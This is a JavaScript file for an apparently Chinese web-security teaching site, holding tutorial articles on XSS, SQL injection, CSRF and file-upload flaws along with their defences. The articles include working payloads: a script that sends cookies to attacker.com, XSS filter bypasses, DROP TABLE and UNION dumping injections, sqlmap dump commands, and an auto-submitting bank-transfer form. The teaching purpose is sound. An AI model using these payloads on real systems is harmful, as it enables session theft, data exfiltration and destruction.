window.onload = function() {
    const articleData = {
            xss: {
                title: 'XSS跨站脚本攻击',
                date: '2024-12-21',
                views: 1523,
                content: `
                    <h2>一、什么是XSS攻击</h2>
                    <p>XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的Web应用程序安全漏洞。攻击者通过在网页中注入恶意脚本代码，当其他用户浏览该网页时，恶意脚本会在用户的浏览器中执行，从而窃取用户信息、劫持用户会话或进行其他恶意操作。</p>

                    <h2>二、XSS攻击类型</h2>
                    
                    <h3>1. 反射型XSS（非持久型）</h3>
                    <p>反射型XSS是最常见的类型，攻击代码不会存储在服务器上，而是通过URL参数或表单提交等方式立即反射给用户。</p>
                    
                    <div class="code-block">
// 存在漏洞的PHP代码示例
&lt;?php
    echo "搜索结果：" . $_GET['keyword'];
?&gt;

// 攻击URL
http://example.com/search.php?keyword=&lt;script&gt;alert('XSS')&lt;/script&gt;
                    </div>

                    <h3>2. 存储型XSS（持久型）</h3>
                    <p>存储型XSS会将恶意脚本永久存储在服务器数据库中，当其他用户访问包含恶意脚本的页面时，脚本会被执行。这是危害最大的XSS类型。</p>
                    
                    <div class="code-block">
// 存在漏洞的评论功能
&lt;div class="comment"&gt;
    &lt;?php echo $comment['content']; ?&gt;
&lt;/div&gt;

// 攻击者提交的评论
&lt;script&gt;
    document.location='http://attacker.com/steal.php?cookie='+document.cookie;
&lt;/script&gt;
                    </div>

                    <h3>3. DOM型XSS</h3>
                    <p>DOM型XSS是通过修改页面的DOM环境来执行恶意脚本，整个攻击过程在客户端完成。</p>

                    <div class="code-block">
// 存在漏洞的JavaScript代码
var keyword = location.hash.substring(1);
document.getElementById('result').innerHTML = "搜索：" + keyword;

// 攻击URL
http://example.com/search.html#&lt;img src=x onerror=alert('XSS')&gt;
                    </div>

                    <h2>三、XSS攻击的危害</h2>
                    <ul>
                        <li><strong>窃取Cookie</strong>：获取用户的会话凭证，实现账户劫持</li>
                        <li><strong>钓鱼攻击</strong>：伪造登录页面骗取用户密码</li>
                        <li><strong>键盘记录</strong>：监听用户键盘输入</li>
                        <li><strong>网页挂马</strong>：传播恶意软件</li>
                        <li><strong>篡改网页</strong>：修改页面内容进行欺诈</li>
                        <li><strong>DDoS攻击</strong>：利用用户浏览器发起攻击</li>
                    </ul>

                    <h2>四、防范措施</h2>
                    
                    <div class="alert-box">
                        <strong>⚠️ 重要提示</strong><br>
                        XSS防御需要采用多层防护策略，单一防护手段往往不够充分。
                    </div>

                    <h3>1. 输入验证与过滤</h3>
                    <div class="code-block">
// PHP输入过滤示例
function sanitizeInput($input) {
    $input = trim($input);
    $input = stripslashes($input);
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    return $input;
}

$userInput = sanitizeInput($_POST['comment']);
                    </div>

                    <h3>2. 输出编码</h3>
                    <p>对输出到HTML页面的内容进行适当编码：</p>
                    <ul>
                        <li>HTML实体编码：< 转换为 &amp;lt;</li>
                        <li>JavaScript编码：用于输出到&lt;script&gt;标签中</li>
                        <li>URL编码：用于输出到URL参数中</li>
                        <li>CSS编码：用于输出到CSS代码中</li>
                    </ul>

                    <h3>3. 使用CSP（内容安全策略）</h3>
                    <div class="code-block">
// 在HTTP响应头中设置CSP
Content-Security-Policy: default-src 'self'; 
    script-src 'self' https://trusted.com; 
    style-src 'self' 'unsafe-inline';
                    </div>

                    <h3>4. HttpOnly Cookie</h3>
                    <p>设置Cookie的HttpOnly属性，防止JavaScript访问Cookie：</p>
                    <div class="code-block">
// PHP设置HttpOnly Cookie
setcookie("session_id", $session_id, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
                    </div>

                    <h3>5. 使用安全框架</h3>
                    <p>现代Web框架通常内置了XSS防护机制：</p>
                    <ul>
                        <li>React：默认对内容进行转义</li>
                        <li>Vue.js：v-html需要谨慎使用</li>
                        <li>Angular：自动进行安全处理</li>
                        <li>Django：模板自动转义</li>
                    </ul>

                    <h2>五、检测与测试</h2>
                    <p>常用的XSS测试payload：</p>
                    <div class="code-block">
// 基础测试
&lt;script&gt;alert('XSS')&lt;/script&gt;

// 绕过过滤
&lt;img src=x onerror=alert('XSS')&gt;
&lt;svg onload=alert('XSS')&gt;
&lt;iframe src="javascript:alert('XSS')"&gt;

// 大小写绕过
&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;

// 编码绕过
&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
                    </div>

                    <h2>六、实战案例</h2>
                    <p>某社交网站存储型XSS漏洞利用：</p>
                    <ol>
                        <li>在个人资料的"个性签名"字段中注入恶意代码</li>
                        <li>其他用户访问攻击者主页时，恶意脚本自动执行</li>
                        <li>脚本窃取访问者的Cookie并发送到攻击者服务器</li>
                        <li>攻击者使用窃取的Cookie登录受害者账户</li>
                    </ol>

                    <div class="alert-box">
                        <strong>🛡️ 安全建议</strong><br>
                        • 永远不要信任用户输入<br>
                        • 对所有输出进行编码<br>
                        • 实施深度防御策略<br>
                        • 定期进行安全审计<br>
                        • 保持框架和库的更新
                    </div>

                    <h2>七、学习资源</h2>
                    <ul>
                        <li>OWASP XSS Prevention Cheat Sheet</li>
                        <li>PortSwigger Web Security Academy</li>
                        <li>HackTheBox XSS靶机练习</li>
                        <li>DVWA XSS模块</li>
                    </ul>
                `
            },
            sql: {
                title: 'SQL注入攻击',
                date: '2024-12-20',
                views: 2156,
                content: `
                    <h2>一、SQL注入简介</h2>
                    <p>SQL注入（SQL Injection）是一种常见且危险的Web应用程序漏洞。攻击者通过在输入字段中插入恶意SQL代码，欺骗应用程序执行非预期的数据库操作，从而获取、修改或删除敏感数据。</p>

                    <h2>二、SQL注入原理</h2>
                    <p>当应用程序将用户输入直接拼接到SQL查询语句中，而没有进行适当的验证和处理时，就可能产生SQL注入漏洞。</p>

                    <div class="code-block">
// 存在SQL注入漏洞的代码
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);

// 攻击者输入
username: admin' --
password: (任意值)

// 实际执行的SQL
SELECT * FROM users WHERE username='admin' -- ' AND password='xxx'
                    </div>

                    <h2>三、SQL注入类型</h2>
                    
                    <h3>1. 联合查询注入（Union-based）</h3>
                    <p>利用UNION操作符合并多个SELECT语句的结果。</p>
                    <div class="code-block">
// 正常查询
SELECT title, content FROM articles WHERE id=1

// 注入payload
1' UNION SELECT username, password FROM users--

// 实际执行
SELECT title, content FROM articles WHERE id='1' 
UNION SELECT username, password FROM users--'
                    </div>

                    <h3>2. 布尔盲注（Boolean-based Blind）</h3>
                    <p>通过页面返回的不同响应来判断注入的SQL语句是否执行成功。</p>
                    <div class="code-block">
// 测试注入点
1' AND '1'='1    // 返回正常
1' AND '1'='2    // 返回异常

// 逐字符猜解数据
1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
                    </div>

                    <h3>3. 时间盲注（Time-based Blind）</h3>
                    <p>利用数据库的延时函数，根据响应时间判断注入是否成功。</p>
                    <div class="code-block">
// MySQL时间盲注
1' AND IF(1=1, SLEEP(5), 0)--

// 猜解数据库名
1' AND IF(LENGTH(DATABASE())=8, SLEEP(5), 0)--
                    </div>

                    <h3>4. 报错注入（Error-based）</h3>
                    <p>利用数据库报错信息获取数据。</p>
                    <div class="code-block">
// MySQL报错注入
1' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--

// 返回错误信息包含数据
XPATH syntax error: '~root@localhost~'
                    </div>

                    <h3>5. 堆叠注入（Stacked Queries）</h3>
                    <p>执行多条SQL语句。</p>
                    <div class="code-block">
// 堆叠查询
1'; DROP TABLE users;--
1'; UPDATE users SET password='hacked' WHERE username='admin';--
                    </div>

                    <h2>四、SQL注入危害</h2>
                    <ul>
                        <li><strong>数据泄露</strong>：窃取数据库中的敏感信息</li>
                        <li><strong>数据篡改</strong>：修改或删除数据库数据</li>
                        <li><strong>身份认证绕过</strong>：绕过登录验证</li>
                        <li><strong>权限提升</strong>：获取管理员权限</li>
                        <li><strong>执行系统命令</strong>：通过数据库函数执行操作系统命令</li>
                        <li><strong>文件读写</strong>：读取或写入服务器文件</li>
                    </ul>

                    <h2>五、防范措施</h2>

                    <h3>1. 使用参数化查询（预编译语句）</h3>
                    <div class="code-block">
// PHP PDO示例
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// Java PreparedStatement
String sql = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
                    </div>

                    <h3>2. 使用ORM框架</h3>
                    <div class="code-block">
// Django ORM
User.objects.filter(username=username, password=password)

// SQLAlchemy
session.query(User).filter(User.username==username, User.password==password)
                    </div>

                    <h3>3. 输入验证</h3>
                    <div class="code-block">
// 白名单验证
function validateId($id) {
    if (!is_numeric($id)) {
        die("Invalid ID");
    }
    return intval($id);
}

// 正则表达式验证
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username");
}
                    </div>

                    <h3>4. 最小权限原则</h3>
                    <p>数据库账户应该只拥有必要的权限：</p>
                    <ul>
                        <li>应用程序使用的数据库账户不应有DROP、CREATE等高危权限</li>
                        <li>不同功能使用不同的数据库账户</li>
                        <li>禁用xp_cmdshell等危险存储过程</li>
                    </ul>

                    <h3>5. 错误信息处理</h3>
                    <p>不要在生产环境中显示详细的数据库错误信息，使用统一的错误页面。</p>

                    <h3>6. Web应用防火墙（WAF）</h3>
                    <p>部署WAF可以拦截常见的SQL注入攻击payload。</p>

                    <h2>六、SQL注入检测工具</h2>
                    <ul>
                        <li><strong>SQLMap</strong>：最强大的自动化SQL注入工具</li>
                        <li><strong>Burp Suite</strong>：专业Web安全测试工具</li>
                        <li><strong>OWASP ZAP</strong>：开源Web应用扫描器</li>
                        <li><strong>Havij</strong>：图形化SQL注入工具</li>
                    </ul>

                    <div class="code-block">
# SQLMap基本用法
sqlmap -u "http://example.com/product.php?id=1" --dbs
sqlmap -u "http://example.com/product.php?id=1" -D database_name --tables
sqlmap -u "http://example.com/product.php?id=1" -D database_name -T users --dump
                    </div>

                    <div class="alert-box">
                        <strong>🛡️ 防护建议</strong><br>
                        • 永远使用参数化查询<br>
                        • 对用户输入进行严格验证<br>
                        • 遵循最小权限原则<br>
                        • 定期进行安全测试<br>
                        • 及时更新框架和数据库
                    </div>
                `
            },
            csrf: {
                title: 'CSRF跨站请求伪造',
                date: '2024-12-19',
                views: 1876,
                content: `
                    <h2>一、CSRF攻击原理</h2>
                    <p>CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种欺骗用户浏览器，以用户的名义发送恶意请求的攻击方式。攻击者诱导受害者访问恶意页面，该页面会自动向目标网站发送请求，由于浏览器会自动携带目标网站的Cookie，服务器会认为这是合法的用户请求。</p>

                    <h2>二、CSRF攻击示例</h2>
                    <div class="code-block">
<!-- 受害者正常的转账请求 -->
POST /transfer HTTP/1.1
Host: bank.com
Cookie: session_id=abc123
amount=1000&to=friend

<!-- 攻击者构造的恶意页面 -->
&lt;html&gt;
&lt;body&gt;
    &lt;form action="https://bank.com/transfer" method="POST" id="csrf-form"&gt;
        &lt;input type="hidden" name="amount" value="10000"&gt;
        &lt;input type="hidden" name="to" value="attacker"&gt;
    &lt;/form&gt;
    &lt;script&gt;
        document.getElementById('csrf-form').submit();
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
                    </div>

                    <h2>三、防范措施</h2>
                    
                    <h3>1. CSRF Token</h3>
                    <p>在表单中加入随机token，服务器验证token的有效性。</p>
                    <div class="code-block">
<!-- 在表单中添加CSRF token -->
&lt;form action="/transfer" method="POST"&gt;
    &lt;input type="hidden" name="csrf_token" value="random_token_here"&gt;
    &lt;input type="text" name="amount"&gt;
    &lt;button type="submit"&gt;转账&lt;/button&gt;
&lt;/form&gt;

// 服务器端验证
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token验证失败');
}
                    </div>

                    <h3>2. SameSite Cookie属性</h3>
                    <div class="code-block">
// 设置SameSite属性
Set-Cookie: session_id=abc123; SameSite=Strict; Secure; HttpOnly

// PHP设置
setcookie("session_id", $session_id, [
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
                    </div>

                    <h3>3. 验证Referer头</h3>
                    <p>检查请求的来源是否为可信域名。</p>

                    <h3>4. 双重Cookie验证</h3>
                    <p>在Cookie和请求参数中都包含token，服务器对比两者是否一致。</p>

                    <div class="alert-box">
                        <strong>🛡️ 最佳实践</strong><br>
                        • 对所有状态改变操作使用CSRF防护<br>
                        • 使用POST而非GET进行敏感操作<br>
                        • 重要操作添加二次确认<br>
                        • 设置合理的会话过期时间
                    </div>
                `
            },
            upload: {
                title: '文件上传漏洞',
                date: '2024-12-18',
                views: 1654,
                content: `
                    <h2>一、文件上传漏洞简介</h2>
                    <p>文件上传漏洞是Web应用中常见的安全问题。当应用程序没有对用户上传的文件进行充分的验证和过滤时，攻击者可能上传恶意文件（如Webshell），从而获取服务器控制权。</p>

                    <h2>二、常见绕过方法</h2>
                    
                    <h3>1. 前端验证绕过</h3>
                    <p>直接修改前端JavaScript代码或使用Burp Suite拦截请求。</p>
                    
                    <h3>2. MIME类型绕过</h3>
                    <div class="code-block">
// 修改Content-Type
Content-Type: image/jpeg
但实际上传的是PHP文件
                    </div>

                    <h3>3. 文件扩展名绕过</h3>
                    <ul>
                        <li>大小写绕过：shell.PhP</li>
                        <li>双写绕过：shell.pphphp</li>
                        <li>空格绕过：shell.php </li>
                        <li>点号绕过：shell.php.</li>
                        <li>::$DATA绕过（Windows）：shell.php::$DATA</li>
                    </ul>

                    <h3>4. 文件内容绕过</h3>
                    <div class="code-block">
// 在图片中插入PHP代码
GIF89a
&lt;?php phpinfo(); ?&gt;
                    </div>

                    <h2>三、防范措施</h2>
                    
                    <h3>1. 白名单验证</h3>
                    <div class="code-block">
// PHP文件上传验证
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_ext, $allowed_ext)) {
    die('不允许的文件类型');
}
                    </div>

                    <h3>2. 文件类型检测</h3>
                    <div class="code-block">
// 检测真实文件类型
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mime)) {
    die('非法文件类型');
}
                    </div>

                    <h3>3. 文件名随机化</h3>
                    <div class="code-block">
// 生成随机文件名
$new_filename = md5(uniqid()) . '.' . $file_ext;
$upload_path = '/uploads/' . $new_filename;
                    </div>

                    <h3>4. 上传目录权限设置</h3>
                    <ul>
                        <li>上传目录禁止执行脚本</li>
                        <li>使用.htaccess配置</li>
                        <li>文件存储在web根目录外</li>
                    </ul>

                    <h3>5. 文件内容检测</h3>
                    <p>扫描上传文件内容，检测是否包含恶意代码。</p>

                    <div class="alert-box">
                        <strong>🛡️ 安全建议</strong><br>
                        • 使用白名单而非黑名单<br>
                        • 检测真实文件类型<br>
                        • 随机化文件名<br>
                        • 设置严格的目录权限<br>
                        • 定期扫描上传文件
                    </div>
                `
            }
        };
        function getQueryParam(name) {
            var search = window.location.search.substring(1);
            var params = search.split("&");
            for (var i = 0; i < params.length; i++) {
                var pair = params[i].split("=");
                if (pair[0] === name) {
                    return decodeURIComponent(pair[1] || "");
                }
            }
            return null;
        }
        var articleId = getQueryParam("article");
        var category = getQueryParam("category");
        function showArticle(articleId) {
            const article = articleData[articleId];
            if (!article) {
                alert('文章内容正在更新中...');
                return;
            }
            document.getElementById('detailTitle').textContent = article.title;
            document.getElementById('detailDate').textContent = article.date;
            document.getElementById('detailViews').textContent = article.views;
            document.getElementById('detailContent').innerHTML = article.content;
            window.scrollTo(0, 0);
        }
        function goBack(){
            window.location.href = "Category.aspx?category=" + encodeURIComponent(getQueryParam("category"));
        }
        showArticle(articleId);
        window.showArticle = showArticle;
        window.goBack = goBack;
}